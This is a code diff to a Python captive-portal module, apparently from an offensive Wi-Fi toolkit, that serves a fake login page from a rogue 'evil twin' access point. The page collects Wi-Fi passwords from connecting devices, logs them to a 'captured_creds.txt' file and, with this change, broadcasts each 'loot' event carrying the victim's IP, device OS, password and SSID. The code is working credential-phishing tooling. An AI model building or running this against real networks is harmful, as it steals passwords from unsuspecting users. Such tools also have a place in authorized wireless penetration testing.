@@ -9,6 +9,7 @@ import datetime
 
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 from logger import Logger
+from event_bus import broadcast_event
 
 logger = Logger(name="captive_portal.py", level=logging.DEBUG)
 b_class = "CaptivePortal"
@@ -17,7 +18,6 @@ b_status = "captive_portal"
 b_port = 0
 b_parent = None
 CAPTIVE_PORT = 80
-CRED_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data', 'captured_creds.txt')
 PORTALS_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'web', 'portals')
 CUSTOM_PORTALS_DIR = os.path.join(PORTALS_DIR, 'custom')
 
@@ -30,7 +30,7 @@ class CaptiveHandler(SimpleHTTPRequestHandler):
     loot_monitor = None
     ssid = ""
     evil_ap_instance = None
-    _cached_template = None
+    cred_file = ""
 
     def _detect_os(self, user_agent):
         ua = user_agent.lower()
@@ -73,7 +73,7 @@ class CaptiveHandler(SimpleHTTPRequestHandler):
         return "<html><body><h2>Portal not found</h2></body></html>"
 
     def _serve_portal(self):
-        html = self._cached_template
+        html = getattr(self, '_cached_template', None)
         if html is None:
             html = self._load_template(self.portal_template)
             html = html.replace("{ACTION_URL}", "/login")
@@ -124,9 +124,17 @@ class CaptiveHandler(SimpleHTTPRequestHandler):
             password = urllib.parse.unquote(parsed.get("password", [""])[0])
             now = str(datetime.datetime.now())
 
-            with open(CRED_FILE, "a") as f:
+            cred_path = self.cred_file or os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'data', 'captured_creds.txt')
+            with open(cred_path, "a") as f:
                 f.write(f"{now} | {password}\n")
             logger.success(f"Captured credential: {password}")
+            broadcast_event("captive_portal_loot", {
+                "victim_ip": self.client_address[0],
+                "device_os": self._detect_os(self.headers.get("User-Agent", "")),
+                "captured_password": password,
+                "timestamp": now,
+                "ssid": CaptiveHandler.ssid
+            })
 
             if self.wpa_validate_enabled and self.wpa_validator and password:
                 result = self.wpa_validator.validate(
@@ -181,13 +189,13 @@ class CaptivePortal:
               evil_ap_instance=None):
         try:
             CaptiveHandler.portal_template = portal_template
-            CaptiveHandler._cached_template = None
             CaptiveHandler.wpa_validate_enabled = wpa_validate_enabled
             CaptiveHandler.wpa_interface = wpa_interface
             CaptiveHandler.wpa_validator = wpa_validator
             CaptiveHandler.loot_monitor = loot_monitor
             CaptiveHandler.ssid = ssid
             CaptiveHandler.evil_ap_instance = evil_ap_instance
+            CaptiveHandler.cred_file = os.path.join(self.shared_data.datadir, 'captured_creds.txt')
 
             self.server = HTTPServer(('0.0.0.0', port), CaptiveHandler)
             self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
